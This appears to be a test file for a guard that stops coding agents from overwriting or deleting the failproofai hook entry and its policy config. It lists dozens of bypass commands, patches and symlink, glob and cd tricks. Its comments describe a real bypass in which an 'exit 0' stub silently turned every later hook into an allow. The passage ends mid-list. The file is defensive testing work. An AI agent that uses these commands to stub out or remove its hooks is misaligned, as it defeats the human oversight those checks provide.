// @vitest-environment node
import { describe, it, expect, vi, beforeAll, afterAll } from "vitest";
import { mkdirSync, mkdtempSync, readFileSync, rmSync, symlinkSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { BUILTIN_POLICIES } from "../../src/hooks/builtin-policies";
import { listIntegrations } from "../../src/hooks/integrations";
import type { PolicyContext } from "../../src/hooks/policy-types";

// Same mocks as guard-installed-code.test.ts. The symlink cases below use the
// real synchronous `node:fs` on a temp directory, which these leave alone.
vi.mock("node:fs/promises", () => ({
  readFile: vi.fn(),
  writeFile: vi.fn(),
  stat: vi.fn().mockResolvedValue({ size: 0 }),
  open: vi.fn(),
}));

vi.mock("node:child_process", () => ({
  execSync: vi.fn(),
  execFileSync: vi.fn(),
}));

function makeCtx(overrides: Partial<PolicyContext> = {}): PolicyContext {
  return { eventType: "PreToolUse", payload: {}, toolName: undefined, toolInput: undefined, ...overrides };
}

const policy = BUILTIN_POLICIES.find((p) => p.name === "block-failproofai-commands")!;

const bash = async (command: string) =>
  (await policy.fn(makeCtx({ toolName: "Bash", toolInput: { command } }))).decision;

const bashIn = async (cwd: string, command: string) =>
  (await policy.fn(makeCtx({ toolName: "Bash", toolInput: { command }, session: { cwd } }))).decision;

const write = async (file_path: string, cwd?: string) =>
  policy.fn(
    makeCtx({
      toolName: "Write",
      toolInput: { file_path, content: "#!/bin/sh\nexit 0\n" },
      ...(cwd ? { session: { cwd } } : {}),
    }),
  );

/** A command as the named agent CLI sends it, from the project's directory. */
const bashAs = async (cli: PolicyContext["cli"], toolInput: Record<string, unknown>) =>
  (await policy.fn(makeCtx({ toolName: "Bash", toolInput, cli, session: { cwd: "/work/proj" } }))).decision;

/** An `Edit` carrying a patch the way Codex's `apply_patch` does. */
const patch = async (toolInput: Record<string, unknown>, cwd = "/work/proj") =>
  (await policy.fn(makeCtx({ toolName: "Edit", toolInput, session: { cwd } }))).decision;

/** A patch in the format Codex's `apply_patch` takes. */
const v4a = (...lines: string[]) => ["*** Begin Patch", ...lines, "*** End Patch", ""].join("\n");

/** `count` option words of 32 distinct letters, each with a value glued on. */
const optionClusters = (count: number) =>
  Array.from({ length: count }, (_, i) => {
    let letters = "";
    for (let k = 0, n = i; k < 31; k++, n = Math.floor(n / 26) + k) letters += "abcdefghijklmnopqrstuvwxyz"[n % 26];
    return `-${letters}q${i}`;
  }).join(" ");

/**
 * A project-scope hook is `npx -y failproofai --hook …`, so that a committed
 * settings file names no machine's path. npx runs a
 * `node_modules/.bin/failproofai` it finds in the project, or in ANY directory
 * above it, before the global install or its own cache, without checking what
 * the file is. One Write of `exit 0` there turned every later hook in that tree
 * into an allow, and the stub stayed for every later session — the guard
 * protected `~/.failproofai` and, with #1050, the installed package, but not
 * the entry npx actually runs. (FailproofAI/agenteye#1795)
 */
describe("block-failproofai-commands — the entry a project-scope npx hook runs", () => {
  describe("file tools", () => {
    it.each([
      ["the project's own", "/work/proj/node_modules/.bin/failproofai"],
      ["a parent directory's", "/work/node_modules/.bin/failproofai"],
      ["the home directory's, above every project in it", "/home/u/node_modules/.bin/failproofai"],
      ["the npx cache's", "/home/u/.npm/_npx/0a1b2c3d4e5f6789/node_modules/.bin/failproofai"],
      ["a monorepo package's", "/work/proj/packages/api/node_modules/.bin/failproofai"],
    ])("denies writing %s node_modules/.bin/failproofai", async (_where, path) => {
      const result = await write(path);
      expect(result.decision).toBe("deny");
      expect(result.reason).toMatch(/failproofai's installed code/);
    });

    // npm writes `.cmd` and `.ps1` shims beside the entry on Windows, and bun
    // writes `.exe` and `.bunx`.
    it.each([
      "C:\\work\\proj\\node_modules\\.bin\\failproofai",
      "C:\\work\\proj\\node_modules\\.bin\\failproofai.cmd",
      "C:\\work\\proj\\node_modules\\.bin\\failproofai.ps1",
      "C:/work/proj/node_modules/.bin/failproofai.exe",
      "C:/work/proj/node_modules/.bin/failproofai.bunx",
    ])("denies writing the Windows entry %s", async (path) => {
      expect((await write(path)).decision).toBe("deny");
    });

    it("denies Edit and NotebookEdit of the entry", async () => {
      const edit = await policy.fn(
        makeCtx({
          toolName: "Edit",
          toolInput: { file_path: "/work/proj/node_modules/.bin/failproofai", old_string: "exec", new_string: "exit 0 #" },
        }),
      );
      expect(edit.decision).toBe("deny");
      const notebook = await policy.fn(
        makeCtx({ toolName: "NotebookEdit", toolInput: { notebook_path: "/work/proj/node_modules/.bin/failproofai" } }),
      );
      expect(notebook.decision).toBe("deny");
    });

    it("denies the relative path a write from the project names", async () => {
      expect((await write("node_modules/.bin/failproofai", "/work/proj")).decision).toBe("deny");
      expect((await write("./node_modules/.bin/failproofai", "/work/proj")).decision).toBe("deny");
      expect((await write("../node_modules/.bin/failproofai", "/work/proj")).decision).toBe("deny");
    });

    // macOS volumes are case-insensitive by default, and a path resolver
    // collapses `//` and `/./`: every one of these opens the same file.
    it("matches every spelling that opens the same file", async () => {
      expect((await write("/Users/u/proj/Node_Modules/.BIN/FailproofAI")).decision).toBe("deny");
      expect((await write("/work/proj/node_modules//.bin/./failproofai")).decision).toBe("deny");
    });

    // Codex's `apply_patch` (canonical `Edit`) carries its patch in
    // `tool_input.command` and names no `file_path`; OpenCode's sends
    // `patchText`. Every file a patch names is one the tool writes (found by
    // hermes on FailproofAI/failproofai#1058).
    describe("patches", () => {
      it.each([
        ["a file it adds", { command: v4a("*** Add File: node_modules/.bin/failproofai", "+#!/bin/sh", "+exit 0") }],
        ["a file it updates", { command: v4a("*** Update File: node_modules/.bin/failproofai", "@@", "-exec node cli.mjs", "+exit 0") }],
        ["a file it deletes", { command: v4a("*** Delete File: node_modules/.bin/failproofai") }],
        ["where it moves a file to", { command: v4a("*** Update File: scripts/stub.sh", "*** Move to: node_modules/.bin/failproofai", "@@", "+exit 0") }],
        ["an absolute path", { command: v4a("*** Add File: /work/proj/node_modules/.bin/failproofai", "+exit 0") }],
        ["a parent directory's entry", { command: v4a("*** Add File: ../node_modules/.bin/failproofai", "+exit 0") }],
        ["a loosely spaced header", { command: v4a("  ***  Add File:   node_modules/.bin/failproofai  ", "+exit 0") }],
        ["the state", { command: v4a("*** Update File: /home/u/.failproofai/policies-config.json", "@@", "+{}") }],
        ["the entry, as OpenCode's patchText", { patchText: v4a("*** Add File: node_modules/.bin/failproofai", "+exit 0") }],
        ["the entry, in an argv", { command: ["apply_patch", v4a("*** Add File: node_modules/.bin/failproofai", "+exit 0")] }],
        ["the entry, as a unified diff", { command: "--- a/node_modules/.bin/failproofai\n+++ b/node_modules/.bin/failproofai\n@@ -1 +1 @@\n-exec\n+exit 0\n" }],
        ["the entry, from the directory the call names", { command: v4a("*** Add File: failproofai", "+exit 0"), workdir: "/work/proj/node_modules/.bin" }],
      ])("denies a patch naming %s", async (_label, toolInput) => {
        expect(await patch(toolInput)).toBe("deny");
      });

      it("denies a patch naming the entry from a session standing in .bin", async () => {
        expect(await patch({ command: v4a("*** Add File: failproofai", "+exit 0") }, "/work/proj/node_modules/.bin")).toBe("deny");
      });

      it.each([
        ["a patch to project files", { command: v4a("*** Update File: src/app.ts", "@@", "-a", "+b", "*** Add File: src/new.ts", "+x") }],
        ["a patch adding another package's entry", { command: v4a("*** Add File: node_modules/.bin/my-tool", "+exit 0") }],
        ["a unified diff of project files", { command: "--- a/src/app.ts\n+++ b/src/app.ts\n@@ -1 +1 @@\n-a\n+b\n" }],
        // What the tool writes is not a patch it applies, whatever it says.
        ["an Edit whose new text quotes a header", { file_path: "docs/patching.md", old_string: "a", new_string: "*** Add File: node_modules/.bin/failproofai" }],
      ])("allows %s", async (_label, toolInput) => {
        expect(await patch(toolInput)).toBe("allow");
      });

      it("allows a Write whose content quotes a header", async () => {
        const result = await policy.fn(
          makeCtx({
            toolName: "Write",
            toolInput: { file_path: "docs/patching.md", content: "*** Update File: node_modules/.bin/failproofai\n" },
            session: { cwd: "/work/proj" },
          }),
        );
        expect(result.decision).toBe("allow");
      });
    });

    describe("through links", () => {
      let root: string;

      beforeAll(() => {
        root = mkdtempSync(join(tmpdir(), "fpai-npx-guard-"));
        mkdirSync(join(root, "proj", "node_modules", ".bin", "sub"), { recursive: true });
        mkdirSync(join(root, "proj", "tools"), { recursive: true });
        // Neither link's own path says anything about failproofai or `.bin`.
        symlinkSync(join(root, "proj", "node_modules", ".bin"), join(root, "proj", "tools", "bins"));
        symlinkSync(join(root, "proj", "node_modules", ".bin", "failproofai"), join(root, "proj", "tools", "hook"));
        // A link into a directory below `.bin`, and one to `node_modules`.
        symlinkSync(join(root, "proj", "node_modules", ".bin", "sub"), join(root, "proj", "tools", "deep"));
        symlinkSync(join(root, "proj", "node_modules"), join(root, "proj", "nm"));
        mkdirSync(join(root, "proj", "out"));
      });

      afterAll(() => {
        rmSync(root, { recursive: true, force: true });
      });

      // The entry does not exist yet in a project with no dependencies, so the
      // link is dangling: the write creates the stub at the link's target.
      it("denies a write through a link to the entry, even before it exists", async () => {
        expect((await write(join(root, "proj", "tools", "hook"))).decision).toBe("deny");
      });

      it("denies a write through a link to the .bin directory", async () => {
        expect((await write(join(root, "proj", "tools", "bins", "failproofai"))).decision).toBe("deny");
        expect((await write("tools/bins/failproofai", join(root, "proj"))).decision).toBe("deny");
      });

      it("still allows other files through the same link", async () => {
        expect((await write(join(root, "proj", "tools", "bins", "my-script"))).decision).toBe("allow");
      });

      // The shell follows the same links the file tools do.
      it.each([
        "printf x > tools/bins/failproofai",
        "cp /tmp/stub.sh tools/bins/failproofai",
        "cp /tmp/stage/failproofai tools/bins/",
        "tee tools/bins/failproofai < /tmp/stub.sh",
        "printf x > tools/hook",
        // A `..` after a link steps out of where the link points, as the
        // kernel resolves it, not out of the link's own directory.
        "printf x > tools/deep/../failproofai",
        "cp /tmp/stub.sh tools/deep/../failproofai",
        // What a copy puts INTO a linked bin directory: contents, a glob, a
        // name the server picks.
        "cp -r /tmp/stage/. tools/bins/",
        "cp -rT /tmp/stage tools/bins",
        "cp /tmp/stage/* tools/bins/",
        "curl --output-dir tools/bins -OJ https://example.com/dl",
        // A directory named `.bin` moved into a linked `node_modules`.
        "mv /tmp/x/.bin nm/",
      ])("denies a shell write through a link: %s", async (command) => {
        expect(await bashIn(join(root, "proj"), command)).toBe("deny");
        expect(await bash(`cd '${join(root, "proj")}' && ${command}`)).toBe("deny");
      });

      it.each([
        "printf x > tools/bins/my-script",
        "cat tools/bins/failproofai",
        "ls -la tools/bins/ > listing.txt",
        "printf x > tools/deep/../my-tool",
        "cp -r /tmp/stage/. out/",
      ])(
        "still allows shell work through a link: %s",
        async (command) => {
          expect(await bashIn(join(root, "proj"), command)).not.toBe("deny");
        },
      );

      it("denies a patch through a link to the entry or the .bin directory", async () => {
        for (const file of ["tools/hook", "tools/bins/failproofai", "tools/deep/../failproofai"]) {
          expect(await patch({ command: v4a(`*** Update File: ${file}`, "@@", "+exit 0") }, join(root, "proj"))).toBe("deny");
        }
      });

      // An output file glued to its option, through a link on disk (found by
      // hermes on FailproofAI/failproofai#1058).
      it.each([
        "curl -sohook https://example.com/x",
        "curl -so./hook https://example.com/x",
        "curl -sobins/failproofai https://example.com/x",
        "wget -qOhook https://example.com/x",
        "gcc -ohook main.c",
      ])("denies an output file glued to its option through a link: %s", async (command) => {
        expect(await bashIn(join(root, "proj", "tools"), command)).toBe("deny");
      });

      it("denies a sed script writing the entry through a link", async () => {
        expect(await bashIn(join(root, "proj"), "sed -n 'w tools/bins/failproofai' /tmp/stub.sh")).toBe("deny");
        expect(await bashIn(join(root, "proj"), "sed -n '1wtools/hook' /tmp/stub.sh")).toBe("deny");
        expect(await bashIn(join(root, "proj"), "sed -e 's/w/x/;1wtools/hook' /tmp/stub.sh")).toBe("deny");
      });

      it("denies a named output that curl puts into a linked --output-dir", async () => {
        expect(await bashIn(join(root, "proj"), "curl --output-dir tools/bins -o failproofai https://example.com/x")).toBe("deny");
      });

      it("allows a glued output file that is no link", async () => {
        expect(await bashIn(join(root, "proj", "tools"), "curl -sohook.txt https://example.com/x")).not.toBe("deny");
      });

      // Links this line makes, resolved as the kernel resolves them: each `..`
      // after the link it follows, any number of them up to the kernel's 40,
      // and every form of `ln` that puts one inside a directory (found by
      // hermes on FailproofAI/failproofai#1058).
      it.each([
        ["a `..` after a link made on the line", "ln -s node_modules/.bin/sub inline-deep; printf x > inline-deep/../failproofai"],
        ["the same, after &&", "ln -s node_modules/.bin/sub inline-deep && cp /tmp/stub.sh inline-deep/../failproofai"],
        [
          "a chain of ten links",
          ["ln -s node_modules/.bin l1", ...Array.from({ length: 9 }, (_, i) => `ln -s l${i + 1} l${i + 2}`)].join("; ") +
            "; printf x > l10/failproofai",
        ],
        [
          "a chain longer than the kernel follows",
          ["ln -s node_modules/.bin l1", ...Array.from({ length: 44 }, (_, i) => `ln -s l${i + 1} l${i + 2}`)].join("; ") +
            "; printf x > l45/failproofai",
        ],
        ["two links pointing at each other", "ln -s a b; ln -s b a; printf x > a/x"],
        ["a link put into the current directory", "ln -s node_modules/.bin/failproofai .; printf x > failproofai"],
        ["a link put into a directory with a slash", "ln -s node_modules/.bin/failproofai out/; printf x > out/failproofai"],
        ["a link put into an existing directory", `ln -s ROOT/node_modules/.bin/failproofai out; printf x > out/failproofai`],
        ["a link put into -t's directory", `ln -st out ROOT/node_modules/.bin/failproofai; printf x > out/failproofai`],
        ["a link put into --target-directory's", `ln --symbolic --target-directory=out ROOT/node_modules/.bin/failproofai; printf x > out/failproofai`],
        ["ln -s with one operand", "ln -s node_modules/.bin/failproofai; printf x > failproofai"],
        ["a directory the line makes first", `mkdir newdir; ln -s ROOT/node_modules/.bin/failproofai newdir; printf x > newdir/failproofai`],
        ["ln -r, which reads the target from here", "ln -sr node_modules/.bin/failproofai out/x; printf x > out/x"],
        ["a target the walk cannot read, naming .bin", 'ln -s "$(npm root)/.bin" b; printf x > b/failproofai'],
        ["a target the walk cannot read at all", 'ln -s "$D" b; printf x > b/failproofai'],
        ["a substitution's directory, filled with what is in another", 'ln -s "$(npm root)/.bin" d; cp -r /tmp/stage/. d/'],
      ])("denies a write through %s", async (_label, command) => {
        expect(await bashIn(join(root, "proj"), command.replaceAll("ROOT", join(root, "proj")))).toBe("deny");
      });

      // `cd -P` (or any `cd` after `set -P`) stands where the path really is,
      // each link followed before its `..` (found by hermes on
      // FailproofAI/failproofai#1058); a logical `cd` takes `..` as text, as
      // bash does, and the kernel still follows links in what is written after.
      it.each([
        "cd -P tools/deep/.. && printf x > failproofai",
        "cd -LP tools/deep/.. && printf x > failproofai",
        "set -P; cd tools/deep/.. && printf x > failproofai",
        "set -o physical; cd tools/deep/.. && printf x > failproofai",
        "cd -P tools/deep && cd .. && printf x > failproofai",
        "cd tools/deep && printf x > ../failproofai",
        // A subshell's shell options are its own (found by hermes on
        // FailproofAI/failproofai#1058).
        "set -P; (set +P); cd tools/deep/.. && printf x > failproofai",
        "(set -P; cd tools/deep/.. && printf x > failproofai)",
      ])("denies a write after a physical move through a link: %s", async (command) => {
        expect(await bashIn(join(root, "proj"), command)).toBe("deny");
      });

      it.each([
        "cd tools/deep/.. && printf x > failproofai",
        "cd -L tools/deep/.. && printf x > failproofai",
        "set -P; set +P; cd tools/deep/.. && printf x > failproofai",
        "(set -P); cd tools/deep/.. && printf x > failproofai",
        "(set -P; cd tools/deep/..); printf x > failproofai",
      ])("still allows a write after a logical move: %s", async (command) => {
        expect(await bashIn(join(root, "proj"), command)).not.toBe("deny");
      });

      // A glob expands where its literal directories really are (found by
      // hermes on FailproofAI/failproofai#1058).
      it.each([
        "cp /tmp/stub.sh tools/bins/fail*",
        "cp /tmp/stub.sh tools/bins/failpro?fai",
        "cp /tmp/stub.sh tools/bins/[f]ailproofai",
        "printf x > tools/bins/fail*",
        "cd tools/bins && cp /tmp/stub.sh fail*",
        "cp /tmp/stub.sh tools/deep/../fail*",
      ])("denies a glob that expands onto the entry through a link: %s", async (command) => {
        expect(await bashIn(join(root, "proj"), command)).toBe("deny");
      });

      it.each(["ls tools/bins/*", "cat tools/bins/fail*", "cp /tmp/stub.sh tools/bins/my-*", "rm -rf tools/bins/*"])(
        "still allows a glob through a link that is no write of the entry: %s",
        async (command) => {
          expect(await bashIn(join(root, "proj"), command)).not.toBe("deny");
        },
      );

      it.each([
        "ln -s node_modules/.bin/sub d; printf x > d/../notes.txt",
        "ln -s /tmp/x y; echo hi > y",
        'ln -s "$TARGET" current; echo hi > current/log.txt',
        "ln -sf build/app current; ./current --version",
        // A variable the line never sets is read as an unknown `cd` is.
        'ln -sfn "$RELEASE_DIR" current && cp -r shared/config current/',
      ])("still allows a write through a link made on the line: %s", async (command) => {
        expect(await bashIn(join(root, "proj"), command)).not.toBe("deny");
      });
    });

    // A pattern in a directory component is expanded the way the shell expands
    // it, against what is on disk, and each path it reaches is followed through
    // its links: with `bins` a link to `node_modules/.bin` and the entry there,
    // `b*/failproofai` is the entry (found by hermes on
    // FailproofAI/failproofai#1058).
    describe("globs expanded on disk", () => {
      let root: string;

      beforeAll(() => {
        root = mkdtempSync(join(tmpdir(), "fpai-npx-glob-"));
        mkdirSync(join(root, "proj", "node_modules", ".bin"), { recursive: true });
        mkdirSync(join(root, "proj", "src"));
        mkdirSync(join(root, "proj", "out"));
        writeFileSync(join(root, "proj", "node_modules", ".bin", "failproofai"), "#!/bin/sh\n");
        writeFileSync(join(root, "proj", "package.json"), "{}\n");
        symlinkSync(join(root, "proj", "node_modules", ".bin"), join(root, "proj", "bins"));
        symlinkSync(join(root, "proj", "node_modules", ".bin", "failproofai"), join(root, "proj", "hook"));
      });

      afterAll(() => {
        rmSync(root, { recursive: true, force: true });
      });

      it.each([
        "cp /tmp/stub.sh b*/failproofai",
        "cp /tmp/stub.sh bi?s/failproofai",
        "cp /tmp/stub.sh [b]ins/failproofai",
        "printf x > b*/failproofai",
        "tee {bins,x}/failproofai < /tmp/stub.sh",
        // A pattern or brace in the last component that matches a link to the
        // entry (found by hermes on FailproofAI/failproofai#1058).
        "cp /tmp/stub.sh hoo*",
        "printf x > ho?k",
        "cp /tmp/stub.sh {hook,nothing}",
        "tee {hook,x} < /tmp/stub.sh",
        // Past the brace words that are expanded on disk, the rest are refused,
        // not dropped: `hook` is the 65th word here (found by hermes on
        // FailproofAI/failproofai#1058).
        "tee {x{a,b,c,d}{1,2,3,4}{i,j,k,l},hook} </dev/null",
        "tee {hook,x{a,b,c,d}{1,2,3,4}{i,j,k,l}} </dev/null",
      ])("denies a glob or brace through a linked directory onto the entry: %s", async (command) => {
        expect(await bashIn(join(root, "proj"), command)).toBe("deny");
      });

      it.each([
        "cat */package.json",
        "rm -rf */dist",
        "ls b*/",
        "cp /tmp/stub.sh s*/notes.txt",
        "tee {out,src}/notes.txt < /tmp/stub.sh",
        // Sweeps of npm's bin directory and `node_modules` stay sweeps with the
        // entry on disk, and reading through a link is a read.
        "rm -rf node_modules/.bin/*",
        "rm -rf node_modules/*",
        "ls *",
        "cat hook",
        "tee {x{a,b,c,d}{1,2,3,4}{i,j,k,l},notes} </dev/null",
        "mkdir -p {a,b,c,d}/{e,f,g,h}/{i,j,k,l}/{m,n,o,p}",
      ])("still allows a glob that reaches no protected path: %s", async (command) => {
        expect(await bashIn(join(root, "proj"), command)).not.toBe("deny");
      });
    });

    // The entry, and nothing else that lives beside it or shares its name.
    it.each([
      ["another package's entry", "/work/proj/node_modules/.bin/tsc"],
      ["an entry that only shares a prefix", "/work/proj/node_modules/.bin/failproofai-extras"],
      ["a name npx never runs for `failproofai`", "/work/proj/node_modules/.bin/failproofai.sh"],
      ["a project file named after the product", "/work/proj/scripts/failproofai.sh"],
      ["a directory of that name under .bin", "/work/proj/.bin/failproofai/README.md"],
      ["a file under a directory whose name ends in .bin", "/data/firmware.bin/failproofai"],
      // Anything in front of `.bin` in the same component makes it another name.
      ["a fixture under a directory named fixture+.bin", "/work/proj/fixture+.bin/failproofai"],
    ])("allows writing %s", async (_label, path) => {
      expect((await write(path)).decision).toBe("allow");
    });
  });

  describe("shell commands", () => {
    it.each([
      ["a redirect", "printf '#!/bin/sh\\nexit 0\\n' > node_modules/.bin/failproofai"],
      ["an append", "echo 'exit 0' >> ./node_modules/.bin/failproofai"],
      ["a copy", "cp /tmp/stub.sh node_modules/.bin/failproofai"],
      ["a move", "mv /tmp/stub.sh node_modules/.bin/failproofai"],
      ["a link", "ln -sf /tmp/stub.sh node_modules/.bin/failproofai"],
      ["tee", "tee node_modules/.bin/failproofai < /tmp/stub.sh"],
      ["install", "install -m 755 /tmp/stub.sh node_modules/.bin/failproofai"],
      ["making a stub executable", "chmod +x node_modules/.bin/failproofai"],
      ["an in-place sed", "sed -i 's/exec/exit 0 #/' node_modules/.bin/failproofai"],
      ["an interpreter writing it", `python3 -c "open('node_modules/.bin/failproofai','w').write('exit 0')"`],
      ["a parent directory's entry", "cp /tmp/stub.sh ../node_modules/.bin/failproofai"],
      ["the home directory's entry", "cp /tmp/stub.sh ~/node_modules/.bin/failproofai"],
      ["the entry named from inside node_modules", "cd node_modules && cp /tmp/stub.sh .bin/failproofai"],
      ["the Windows shim", "cp /tmp/stub.cmd node_modules/.bin/failproofai.cmd"],
      ["a variable holding the entry", "B=node_modules/.bin/failproofai; cp /tmp/stub.sh $B"],
      ["a glob onto the entry", "cp /tmp/stub.sh node_modules/.bin/fail*"],
      ["a quoted spelling", `cp /tmp/stub.sh node_modules/.bin/fail"proof"ai`],
      // The path is on the line only in pieces: a file named `failproofai`
      // copied, moved or linked INTO the directory npx searches.
      ["a copy into the .bin directory", "cp /tmp/stage/failproofai node_modules/.bin/"],
      ["a copy into the .bin directory, no trailing slash", "cp /tmp/stage/failproofai node_modules/.bin"],
      ["a move into the .bin directory", "mv ./failproofai node_modules/.bin/"],
      ["a link into the .bin directory", "ln -s /tmp/stage/failproofai node_modules/.bin"],
      ["a copy with -t", "cp -t node_modules/.bin /tmp/stage/failproofai"],
      ["a copy with --target-directory=", "cp --target-directory=node_modules/.bin /tmp/stage/failproofai"],
      ["install -D into the directory", "install -D -m 755 /tmp/stage/failproofai node_modules/.bin/"],
      ["rsync into the directory", "rsync -a /tmp/stage/failproofai node_modules/.bin/"],
      ["a copy among other files", "cp /tmp/a.sh /tmp/stage/failproofai /tmp/b.sh node_modules/.bin/"],
      ["a copy after --", "cp -- /tmp/stage/failproofai node_modules/.bin/"],
    ])("denies %s", async (_label, command) => {
      expect(await bash(command)).toBe("deny");
    });

    // The same rule reaches the paths #1050 protects: moving a package
    // directory named `failproofai` into a global `node_modules` replaces it.
    it("denies moving a directory named failproofai into a node_modules", async () => {
      expect(await bash("mv /tmp/build/failproofai /home/u/.nvm/versions/node/v22.11.0/lib/node_modules/")).toBe("deny");
    });

    // Every GNU spelling of the target directory, which puts the sources AFTER
    // it. rsync has no such option: its `-t` is `--times`, and its last operand
    // is still the destination.
    it.each([
      ["-t glued to its value", "cp -tnode_modules/.bin /tmp/stage/failproofai"],
      ["-t at the end of a cluster", "cp -vt node_modules/.bin /tmp/stage/failproofai"],
      ["-t inside install's cluster", "install -Dt node_modules/.bin /tmp/stage/failproofai"],
      ["-t on ln", "ln -st node_modules/.bin /tmp/stage/failproofai"],
      ["an abbreviated --target=", "cp --target=node_modules/.bin /tmp/stage/failproofai"],
      ["an abbreviated --target with its value apart", "cp --target node_modules/.bin /tmp/stage/failproofai"],
      ["rsync's -t, which is --times", "rsync -t /tmp/stage/failproofai node_modules/.bin/"],
    ])("denies a copy into the .bin directory with %s", async (_label, command) => {
      expect(await bash(command)).toBe("deny");
    });

    // A redirect or a comment after the destination was read as the
    // destination, so every copy check judged `2>/dev/null` or `x`. That let
    // the state through too, before this file existed.
    it.each([
      ["a stderr redirect", "cp /tmp/stub.sh node_modules/.bin/failproofai 2>/dev/null"],
      ["a stdout redirect", "install -m 755 /tmp/stub.sh node_modules/.bin/failproofai > /dev/null"],
      ["2>&1", "rsync /tmp/stub.sh node_modules/.bin/failproofai 2>&1"],
      ["an input redirect", "cp /tmp/stub.sh node_modules/.bin/failproofai < /dev/null"],
      ["a comment", "cp /tmp/stub.sh node_modules/.bin/failproofai # keep"],
      ["a redirect after a copy into the directory", "cp /tmp/stage/failproofai node_modules/.bin/ 2>/dev/null"],
      ["a redirect after a link into the directory", "ln -sf /tmp/stage/failproofai node_modules/.bin 2>/dev/null"],
      ["the state, emptied the same way", "cp /dev/null ~/.failproofai/policies-config.json 2>/dev/null"],
    ])("denies a write followed by %s", async (_label, command) => {
      expect(await bash(command)).toBe("deny");
    });

    // A source that names a protected path is a copy OUT, except when it lands
    // on installed code: a link spelled `…/bin/failproofai` is still a stub.
    it("denies a protected-looking source when it lands on the entry", async () => {
      expect(await bash("cp /tmp/bin/failproofai node_modules/.bin/")).toBe("deny");
      expect(await bash("rsync /tmp/bin/failproofai node_modules/.bin/")).toBe("deny");
    });

    // A protected FILE sits in a directory nothing protects, so the walk has
    // to read a relative word from where a `cd` left the shell.
    it.each([
      ["a redirect after cd", "cd node_modules/.bin && printf 'exit 0' > failproofai"],
      ["a copy after cd", "cd node_modules/.bin && cp /tmp/stub.sh failproofai"],
      ["a copy after pushd", "pushd node_modules/.bin && cp /tmp/stub.sh failproofai"],
      ["chmod after cd", "cd node_modules/.bin && chmod +x failproofai"],
      ["two relative cds", "cd node_modules && cd .bin && cp /tmp/stub.sh failproofai"],
      ["a cd outside a subshell that ran its own", "cd node_modules/.bin && (cd /tmp && ls) && cp /tmp/stub.sh failproofai"],
      ["a copy of a file named failproofai into the directory", "cd node_modules/.bin && cp /tmp/stage/failproofai ."],
    ])("denies %s", async (_label, command) => {
      expect(await bash(command)).toBe("deny");
    });

    // A glob replaces the entry wherever it already exists, whatever path
    // leads to it, so the candidates are tried against every stretch of it.
    it.each([
      ["a parent directory", "cp /tmp/stub.sh ../node_modules/.bin/fail*"],
      ["home", "cp /tmp/stub.sh ~/node_modules/.bin/fail*"],
      ["an absolute path", "cp /tmp/stub.sh /work/proj/node_modules/.bin/fail*"],
      // A default macOS volume resolves the literal parent whatever its case.
      ["an upper-case parent", "rm -rf NODE_MODULES/.BIN/f*"],
      // `/home/u/.failproofai` is a candidate itself; another home is not.
      ["the state, by an absolute path", "rm -rf /home/alice/.failproof*"],
      ["the state, behind `//` and `/./`", "rm -rf ~//./.failproof*"],
      // A home no candidate spells. A dotfile glob that can match
      // `.failproofai` counts wherever it stands, as the name itself does:
      // `rm -rf ~/.cache/.f*` is refused for the same reason.
      ["the state, in a home outside /home", "rm -rf /var/lib/jenkins/.failproof*"],
      ["the state's name in another directory", "rm -rf ~/.cache/.f*"],
    ])("denies a glob onto the entry through %s", async (_label, command) => {
      expect(await bash(command)).toBe("deny");
    });

    // npm's bin directory itself: whatever a directory moved, linked or copied
    // onto it holds becomes an entry, and npx searches every parent's.
    it.each([
      ["a link over home's", "ln -s /tmp/stage ~/node_modules/.bin"],
      ["a move", "mv /tmp/stage node_modules/.bin"],
      ["a recursive copy", "cp -r /tmp/stage/ node_modules/.bin/"],
      ["a copy onto it with -T", "cp -rT /tmp/stage node_modules/.bin"],
      ["a copy of a directory's contents", "cp -a /tmp/stage/. node_modules/.bin/"],
      ["rsync of a directory's contents", "rsync -a /tmp/stage/ node_modules/.bin/"],
      ["a build directory, which becomes the directory when it is missing", "cp -r dist/ node_modules/.bin/"],
    ])("denies %s onto node_modules/.bin", async (_label, command) => {
      expect(await bash(command)).toBe("deny");
    });

    // A word is read without knowing whether it sits in quotes, so a quoted
    // `#` or `<` must not hide the words after it.
    it.each([
      ["a quoted # before an output flag", "curl -sS -H 'X-Ticket: #1795' -o ~/.failproofai/policies-config.json https://example.com/c"],
      ["a quoted # before -delete", "find ~/.failproofai -name 'x #' -o -delete"],
      ["a quoted # before tee's file", "printf 'exit 0' | tee 'a #' node_modules/.bin/failproofai"],
      ["a quoted < in an option value", 'cp /tmp/stub.sh --suffix "y < " node_modules/.bin/failproofai'],
      ["a {fd} redirect after the destination", "cp /tmp/stub.sh node_modules/.bin/failproofai {fd}>/dev/null"],
      ["an abbreviated option's value after the destination", "cp /dev/null ~/.failproofai/policies-config.json --suf x"],
      ["an rsync option's value after the destination", "rsync /tmp/stub.sh node_modules/.bin/failproofai --max-delete 5"],
      ["a .. that steps back into .bin", "cp /tmp/stub.sh node_modules/.bin/x/../failproofai"],
    ])("denies %s", async (_label, command) => {
      expect(await bash(command)).toBe("deny");
    });

    // Paths built from what the same line assigns, and the shell's position
    // carried through every way a shell moves it.
    it.each([
      ["a variable holding the directory", "D=node_modules/.bin; cp /tmp/stub.sh $D/failproofai"],
      ["a variable spliced into the state", "X=ai; rm -rf ~/.failproof$X"],
      ["a variable holding npm's bin directory", "B=~/node_modules/.bin; ln -s /tmp/stage $B"],
      ["a cd into a variable", "D=node_modules/.bin; cd $D && cp /tmp/stub.sh failproofai"],
      ["$PWD after a cd", "cd node_modules/.bin && cp /tmp/stub.sh $PWD/failproofai"],
      ["popd back to the directory", "pushd node_modules/.bin && pushd /tmp && popd && cp /tmp/stub.sh failproofai"],
      ["cd - back to the directory", "cd node_modules/.bin && cd /tmp && cd - && cp /tmp/stub.sh failproofai"],
      ["parentheses inside quotes", 'echo "(" && cd node_modules/.bin && echo ")" && cp /tmp/stub.sh failproofai'],
      ["a directory named .bin moved into a node_modules", "mv /tmp/x/.bin ~/node_modules/"],
      ["a glob of sources into the directory", "cp /tmp/stage/* node_modules/.bin/"],
      ["a glob of sources after -t", "cp -t node_modules/.bin /tmp/stage/*"],
      ["an abbreviated --recursive", "cp --rec /tmp/stage ~/node_modules/.bin"],
      // A `popd` with nothing to return to fails and leaves the shell there.
      ["a popd on an empty stack", "cd node_modules/.bin; popd; cp /tmp/stub.sh failproofai"],
      ["$HOME spelled out", "cd $HOME/node_modules/.bin && cp /tmp/stub.sh failproofai"],
